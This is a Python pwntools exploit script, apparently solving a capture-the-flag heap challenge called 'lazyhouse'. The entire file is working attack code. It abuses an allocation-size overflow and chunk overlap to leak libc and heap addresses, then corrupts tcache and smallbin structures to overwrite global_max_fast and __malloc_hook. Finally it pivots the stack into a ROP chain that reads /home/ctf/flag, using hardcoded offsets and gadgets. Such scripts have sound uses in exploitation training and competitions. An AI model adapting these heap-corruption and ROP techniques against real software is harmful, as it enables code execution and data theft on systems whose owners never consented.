#!/usr/bin/python3
from pwn import *
'''
struct house{
	char *house_data;
	unsigned long  oursize;
	unsigned long size_price; //oursize * 0xda = size_price;
}HOUSE;
'''
####Utils
def allocate(idx,size,data,silent=False,fuck=False):
	io.sendlineafter('choice: ','1')
	io.sendlineafter('Index:',str(idx))
	if fuck==False:
		io.sendlineafter('Size:',str(size))
	else:
		io.sendafter('Size:',size)
	if silent==False:
		io.sendafter('House:',data)

def view(idx):
	io.sendlineafter('choice: ','2')
	io.sendlineafter('Index:',str(idx))
	housedata = io.recvuntil('$')[:-1]
	return housedata

def delete(idx):
	io.sendlineafter('choice: ','3')
	io.sendlineafter('Index:',str(idx))

def edit(idx,data):
	io.sendlineafter('choice: ','4')
	io.sendlineafter('Index:',str(idx))
	io.sendlineafter('House:',data)

def backdoor(data):
	io.sendlineafter('choice:','5')
	io.sendlineafter('House:',data)

####Addr
main_arena = 0x3b2c40
unsorted_bin_offset = main_arena+0x60
small_bin_offset = 0x3b2ee0
global_max_fast = 0x3b4920
__free_hook = 0x3b48c8
__malloc_hook = 0x3b2c30
environ = 0x3b5098

####Gadgets
L_leave_ret = 0x00072393
L_pop_rdi = 0x00127c58
L_pop_rsi = 0x00127749
L_pop_rdx = 0x00193262
L_pop_rax = 0x00037b28
L_syscall = 0x000c2815

####Exploit
io = process('./lazyhouse_ld')
allocate(0,0x4b27ed3604b27fb,'HK',silent=True)
delete(0)
for i in range(7):
	allocate(0,0x88,'HK')
	delete(0)
	allocate(0,0xf8,'HK')
	delete(0)
	allocate(0,0x1f8,'HK')
	delete(0)
allocate(0,0x88,'HK') #0
allocate(1,0x428,'HK') #1
allocate(2,0x1f8,b'A'*0x10+p64(0x450)+p64(0x1e1)+p64(0x460)+p64(0x1d0)) #2
delete(1)
allocate(3,0x438,'HK') #3
edit(0,b'A'*0x88+p64(0x463)[:-1])
allocate(1,0x428,'HKHKHKHK') #1
unsorted_bin = u64(view(2)[0:8])
libc_base = unsorted_bin - unsorted_bin_offset
print(f'Libc: 0x{libc_base:02x}')
delete(0)
heap_base = u64(view(2)[0x8:0x10])-0x1b40
print(f'Heap: 0x{heap_base:02x}')

allocate(0,0x88,'HK') #0
delete(1)
allocate(1,0x208,'HK') #1
allocate(4,0x408,'HK') #4
edit(0,b'A'*0x88+p64(0x451)[:-1])
delete(1)
allocate(1,0x448,
	b'A'*0x208+p64(0x251)+\
	p64(libc_base+small_bin_offset)+p64(heap_base+0x1df0)+\
	p64(heap_base+0x1de0)+p64(heap_base+0x1e00)+\
	p64(0x0)+p64(heap_base+0x1e10)+\
	p64(0x0)+p64(heap_base+0x1e20)+\
	p64(0x0)+p64(heap_base+0x1e30)+\
	p64(0x0)+p64(heap_base+0x1e40)+\
	p64(0x0)+p64(heap_base+0x1e50)+\
	p64(0x0)+p64(libc_base+global_max_fast-0x10))
delete(4)
allocate(4,0x248,b'A'*0x238+p64(0x1e1)) #4

delete(1)
delete(4)
allocate(1,0x448,b'A'*0x208+p64(0x251)+p64(heap_base))
L_ROP = p64(libc_base+L_pop_rdi)+p64(heap_base+0x1eb0)+\
	p64(libc_base+L_pop_rsi)+p64(0x0)+\
	p64(libc_base+L_pop_rax)+p64(0x2)+\
	p64(libc_base+L_syscall)+\
	p64(libc_base+L_pop_rdi)+p64(0x3)+\
	p64(libc_base+L_pop_rsi)+p64(heap_base+0xce0)+\
	p64(libc_base+L_pop_rdx)+p64(0x50)+\
	p64(libc_base+L_pop_rax)+p64(0x0)+\
	p64(libc_base+L_syscall)+\
	p64(libc_base+L_pop_rdi)+p64(0x1)+\
	p64(libc_base+L_pop_rax)+p64(0x1)+\
	p64(libc_base+L_syscall)+\
	p64(libc_base+L_pop_rax)+p64(0x3c)+\
	p64(libc_base+L_syscall)+\
	b'/home/ctf/flag\x00'
allocate(4,0x248,L_ROP+b'A'*(0x238-0xcf)+p64(0x1e1)) #4
allocate(5,0x248,p64(0x0707070707070707)*8+b'A'*0x100+p64(libc_base+__malloc_hook-0x208)) #5
backdoor(b'A'*0x208+p64(libc_base+L_leave_ret))

allocate(6,heap_base+0x1de8,'HK',silent=True)
io.interactive()
